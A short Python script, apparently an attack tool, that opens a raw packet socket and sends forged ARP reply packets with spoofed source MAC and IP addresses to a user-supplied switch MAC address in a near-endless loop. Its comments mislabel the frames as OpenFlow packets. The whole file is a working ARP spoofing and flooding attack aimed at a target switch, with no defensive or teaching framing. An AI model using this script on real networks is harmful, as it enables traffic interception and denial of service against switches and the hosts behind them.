import socket, random, time
from ryu.lib import packet

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0800))

# Prompt the user for the target OpenFlow switch's MAC address
mac_address = input("Enter Target Switch MAC Address: ")
sleep = float(input("Sleep: "))

# Create an OpenFlow packet
for i in range(1, 100**1000):
    pkt = packet.Packet()   
    pkt.add_protocol(packet.ethernet(ethertype=0x0806, dst=mac_address))
    pkt.add_protocol(packet.arp(opcode=2, src_mac='00:11:22:33:44:55', src_ip='192.168.0.1',
                               dst_mac=mac_address, dst_ip='192.168.0.2'))
    s.send(pkt.data)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
